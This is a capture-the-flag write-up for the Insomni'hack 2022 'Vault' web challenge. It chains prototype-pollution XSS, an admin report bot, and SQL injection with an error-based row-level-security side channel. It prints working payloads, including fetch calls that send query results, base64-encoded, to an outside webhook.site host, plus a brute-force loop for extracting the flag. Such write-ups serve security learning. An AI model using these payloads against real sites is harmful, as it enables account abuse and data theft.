---
title: Insomni'hack teaser 2022 – Vault
date: '2022-01-31'
draft: false
authors: ['thebish0p']
tags: ["Insomni'hack teaser 2022", 'Web', 'Prototype Pollution', 'SQLi', 'Error Based Injection']
summary: 'Prototype pollution which allows to run arbitrary js in admin context and retrieve the flag through the sql injection with an error based injection.'
---

## Vault

> by clZ
>
> A competing group has created a so-called secure Vault where people can store their secrets. We have serious doubts on their capacity to actually provide such a service. Could you show everyone that their solution is not as secure as they think?
>
> The Vault is available [here](http://vault.insomnihack.ch:5000/).
>
> They are so confident in their solution that they also released their [source code](https://static.insomnihack.ch/media/Vault_191c4ba6dc394e5713771ac4808a02330fd9583a-9516bb402ba3ca3401458c8d8e08d112cde7a9f7e9a5a9b349dc9ac403e1b48f_RR5HK9s.tgz).

We start by checking the web page and notice that there is a login, register and report link section. So my first thought was trying to find an XSS and report a link in order to grab an admin’s cookie for example but we had an issue we can’t register:

![Registration Error](/static/images/insomnihack-teaser-2022/registration_error.png)

We continue by checking the source code and manage to find a Javascript Protocol Pollution bug that can lead to an XSS `http://vault.insomnihack.ch:5000/?__proto__[url][]=data:,alert(1)//&__proto__[dataType]=script#page=secrets` as shown below:

![Alert XSS](/static/images/insomnihack-teaser-2022/xss_alert_1.png)

Time to try to get a callback from the admin through the report link function so we just add `fetch("https://webhook.site/388bc797-594f-4945-a407-5137e40ced43")` to our payload, report it and get a callback:

![First Callback](/static/images/insomnihack-teaser-2022/first_callback.png)

We noticed at this point that cookies on the site are httpOnly so we need something else:

```python
@app.route('/api/report', methods=['POST'])
def contact():
    url = request.form["url"]
    pattern = re.compile("^https?:\/\/")
    if len(url) > 0 and pattern.match(url):
        try:
            from selenium import webdriver
            from selenium.webdriver.common.keys import Keys
            from selenium.webdriver.chrome.options import Options
            import time
            session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)
            adminsession = dict()
            adminsession["admin"] = 1
            adminsession["username"] = "admin"
            adminsession["password"] = os.environ.get("ADMIN_PWD")
            session_cookie = session_serializer.dumps(dict(adminsession))
            chrome_options = Options()
            chrome_options.headless = True
            chrome_options.add_argument('--no-sandbox')
            driver = webdriver.Chrome("/app/chromedriver", options=chrome_options)
            driver.set_page_load_timeout(30)
            driver.get("http://" + os.environ.get("VHOST") + "/")
            time.sleep(1)
            driver.add_cookie({"name": "session", "value":session_cookie,"httpOnly": True})
            driver.get(url)
            time.sleep(30)
            driver.close()
            return {'status':'OK'}
        except:
            return {'status':'KO','msg':'Error checking page'}
    return {'status':'KO','msg':'Invalid URL'}
```

We recheck the `app.py` file and notice that the `username` parameter in `/api/stats` is prone to SQL injection.

```python
@app.route('/api/stats')
def stats():
    if not "admin" in session or session["admin"] != 1:
        return {'status':'KO', 'msg': 'You are not admin'}
    else:
        try:
            conn_str = ("Driver={ODBC Driver 17 for SQL Server};"
                "Server=db,1433;"
                "Database=Vault;"
                "UID=" + session["username"] + ";"
                "PWD=" + session["password"])
            conn = pyodbc.connect(conn_str)
            cursor = conn.cursor()
            sql = "SELECT inserttime FROM dbo.Stats WHERE username = '" + request.args.get("username") + "'"
            cursor.execute(sql)
            res=cursor.fetchall()
            ret=[]
            for row in res:
                ret.append({'inserttime':row[0]})
            cursor.close()
            conn.close()
            return {'status':'OK','results':ret}
        except:
            return {'status':'NOK'}

```

We continue by adding an injection to our payload `fetch("/api/stats?username=admin' union select 123 --").then(x => x.text()).then(x=>{location='https://webhook.site/32903bb4-075a-4196-933d-2d558ae4a216/?secrets='+btoa(x)})` but we base64 it and then eval the decoded value in order for it to work : `http://vault.insomnihack.ch:5000/?__proto__[url][]=data:,eval(atob(%27ZmV0Y2goIi9hcGkvc3RhdHM/dXNlcm5hbWU9YWRtaW4nIHVuaW9uIHNlbGVjdCAxMjMgLS0iKS50aGVuKHggPT4geC50ZXh0KCkpLnRoZW4oeD0%2be2xvY2F0aW9uPSdodHRwczovL3dlYmhvb2suc2l0ZS8zMjkwM2JiNC0wNzVhLTQxOTYtOTMzZC0yZDU1OGFlNGEyMTYvP3NlY3JldHM9JytidG9hKHgpfSk7%27))//&__proto__[dataType]=script#page=secrets` and get a callback as shown below:

![successful_injection](/static/images/insomnihack-teaser-2022/successful_injection.png)

After several failed attempts of selecting the flag from the database we notice that `instal.sql` has a SecurityPredicate which prevents access from different users to specific rows :

```sql
DROP SECURITY POLICY IF EXISTS dbo.SecurityPolicy;
GO
DROP FUNCTION IF EXISTS dbo.SecurityPredicate;
GO
CREATE FUNCTION dbo.SecurityPredicate
(
  @UserName nvarchar(32)
)
RETURNS TABLE
WITH SCHEMABINDING
AS RETURN
(
  SELECT ok = 1 WHERE USER_NAME() = @UserName
);
GO

CREATE SECURITY POLICY dbo.SecurityPolicy
ADD FILTER PREDICATE dbo.SecurityPredicate(UserName)
ON dbo.Vault WITH (STATE = ON, SCHEMABINDING = ON);
GO
```

After some researching, I find this article named [Beware of Side-Channel Attacks in Row-Level Security in SQL Server 2016](https://www.mssqltips.com/sqlservertip/4379/beware-of-sidechannel-attacks-in-rowlevel-security-in-sql-server-2016/) explaining how to bypass this Predicate by causing an error like a zero division error so we tried to cause an error while trying to bruteforce each character of the flag.

Unfortunately, the CTF ended at this time and didn't manage to finish the challenge on time but the injection required is shown below :

```sql
select 1 from dbo.Vault where username='secret' and secret_name='flag' and 1/(ascii(substring(secret_value,1,1))-GUESS)=1
```

Finally what needs to be done is just looping through the characters of secret_value and sending for each one this payload :

```js
fetch('/api/stats?username=${encodeURIComponent(' union select 1 from dbo.Vault where username='secret' and secret_name='flag' and 1/(ascii(substring(secret_value,${pos},1))-GUESS)=1;-- -')});`
```
